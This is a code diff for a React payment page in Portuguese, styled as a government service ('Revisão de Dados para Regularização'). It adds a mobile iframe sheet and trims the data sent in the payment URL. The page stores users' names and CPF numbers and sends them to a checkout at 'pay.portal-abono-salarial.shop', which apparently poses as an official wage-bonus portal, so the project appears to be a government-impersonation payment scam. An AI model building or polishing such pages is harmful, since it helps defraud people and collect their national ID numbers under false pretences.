@@ -7,20 +7,22 @@ import PageLayout from '@/components/PageLayout';
 import { Table, TableHeader, TableBody, TableFooter, TableHead, TableRow, TableCell, TableCaption } from "@/components/ui/table";
 import { Separator } from "@/components/ui/separator";
 import { Card, CardHeader, CardTitle, CardContent } from "@/components/ui/card";
+import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sheet";
+import { useIsMobile } from "@/hooks/use-mobile";
 
 const Payment: React.FC = () => {
   const [userData, setUserData] = useState<any>(null);
   const [showIframe, setShowIframe] = useState<boolean>(false);
+  const [sheetOpen, setSheetOpen] = useState<boolean>(false);
   const navigate = useNavigate();
   const location = useLocation();
+  const isMobile = useIsMobile();
 
   useEffect(() => {
     if (location.state && location.state.userData) {
       setUserData(location.state.userData);
-      // Store user data in localStorage
       localStorage.setItem("name", location.state.userData.nome || "");
       localStorage.setItem("cpf", location.state.userData.cpf || "");
-      // Default values for required fields that we might not have
       localStorage.setItem("email", localStorage.getItem("email") || "cliente@example.com");
       localStorage.setItem("phone", localStorage.getItem("phone") || "11999999999");
     } else {
@@ -31,9 +33,7 @@ const Payment: React.FC = () => {
 
   const formatCPF = (cpf: string) => {
     if (!cpf) return "";
-    // Remove any non-digit characters
     const digitsOnly = cpf.replace(/\D/g, '');
-    // Apply CPF mask XXX.XXX.XXX-XX
     return digitsOnly.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
   };
 
@@ -52,23 +52,28 @@ const Payment: React.FC = () => {
   };
 
   const openPaymentIframe = () => {
-    const email = localStorage.getItem("email") || "cliente@example.com";
     const name = localStorage.getItem("name") || userData?.nome || "";
-    const phone = localStorage.getItem("phone") || "11999999999";
     const cpf = localStorage.getItem("cpf") || userData?.cpf || "";
-
-    const url = `https://pay.portal-abono-salarial.shop/N1nVZpEdY60GlM6?email=${encodeURIComponent(email)}&name=${encodeURIComponent(name)}&telephone=${encodeURIComponent(phone)}&document=${encodeURIComponent(cpf)}`;
+    const url = `https://pay.portal-abono-salarial.shop/N1nVZpEdY60GlM6?name=${encodeURIComponent(name)}&document=${encodeURIComponent(cpf)}`;
     
-    setShowIframe(true);
-    
-    // Small delay to ensure the iframe container is rendered before setting the src
-    setTimeout(() => {
-      const iframe = document.getElementById("pagamentoIframe") as HTMLIFrameElement;
-      if (iframe) {
-        iframe.src = url;
-        iframe.style.display = "block";
-      }
-    }, 100);
+    if (isMobile) {
+      setSheetOpen(true);
+      setTimeout(() => {
+        const mobileIframe = document.getElementById("mobilePagamentoIframe") as HTMLIFrameElement;
+        if (mobileIframe) {
+          mobileIframe.src = url;
+        }
+      }, 100);
+    } else {
+      setShowIframe(true);
+      setTimeout(() => {
+        const iframe = document.getElementById("pagamentoIframe") as HTMLIFrameElement;
+        if (iframe) {
+          iframe.src = url;
+          iframe.style.display = "block";
+        }
+      }, 100);
+    }
   };
 
   const closeIframe = () => {
@@ -76,6 +81,16 @@ const Payment: React.FC = () => {
     const iframe = document.getElementById("pagamentoIframe") as HTMLIFrameElement;
     if (iframe) {
       iframe.src = "";
+    }
+  };
+
+  const handleSheetOpenChange = (open: boolean) => {
+    setSheetOpen(open);
+    if (!open) {
+      const mobileIframe = document.getElementById("mobilePagamentoIframe") as HTMLIFrameElement;
+      if (mobileIframe) {
+        mobileIframe.src = "";
+      }
     }
   };
 
@@ -91,6 +106,7 @@ const Payment: React.FC = () => {
 
   return (
     <PageLayout>
+      {/* Desktop Modal Iframe */}
       {showIframe && (
         <div className="fixed inset-0 z-50 bg-black bg-opacity-50 flex justify-center items-center p-4">
           <div className="relative bg-white rounded-lg w-full max-w-4xl h-[90vh] flex flex-col">
@@ -116,6 +132,23 @@ const Payment: React.FC = () => {
         </div>
       )}
 
+      {/* Mobile Sheet Iframe */}
+      <Sheet open={sheetOpen} onOpenChange={handleSheetOpenChange}>
+        <SheetContent side="bottom" className="h-[90vh] p-0 pt-6">
+          <SheetHeader className="px-4 py-2">
+            <SheetTitle className="text-center">Pagamento</SheetTitle>
+          </SheetHeader>
+          <div className="h-full pb-12">
+            <iframe
+              id="mobilePagamentoIframe"
+              className="w-full h-full border-0"
+              title="Pagamento Mobile"
+              allow="payment"
+            ></iframe>
+          </div>
+        </SheetContent>
+      </Sheet>
+
       <div className="container mx-auto p-0 pb-4 relative max-w-3xl">
         <div className="absolute top-0 left-0 mt-2 ml-0">
           <Button 
@@ -133,7 +166,6 @@ const Payment: React.FC = () => {
             Revisão de Dados para Regularização
           </h2>
 
-          {/* Informações Pessoais - Cartão compacto */}
           <Card className="mb-4 shadow-sm">
             <CardHeader className="pb-1 pt-3 px-4">
               <CardTitle className="text-sm flex items-center">
@@ -167,7 +199,6 @@ const Payment: React.FC = () => {
             </CardContent>
           </Card>
 
-          {/* Tabela de Detalhes compacta */}
           <div className="bg-white rounded-lg shadow-sm overflow-hidden mb-4">
             <div className="p-2 bg-govblue-50">
               <h3 className="font-medium text-govblue-700 text-sm flex items-center">
@@ -225,7 +256,6 @@ const Payment: React.FC = () => {
             </Table>
           </div>
 
-          {/* Aviso compacto */}
           <div className="p-2 bg-amber-50 border-l-4 border-amber-500 rounded-r-md mb-4 text-xs">
             <div className="flex items-start">
               <Clock className="h-4 w-4 text-amber-600 mt-0.5 mr-2 flex-shrink-0" />
@@ -235,7 +265,6 @@ const Payment: React.FC = () => {
             </div>
           </div>
 
-          {/* Botão de pagamento */}
           <div className="flex justify-center">
             <Button 
               className="gov-button bg-govblue-600 hover:bg-govblue-500 rounded-full px-4 py-2 text-sm w-full max-w-xs"
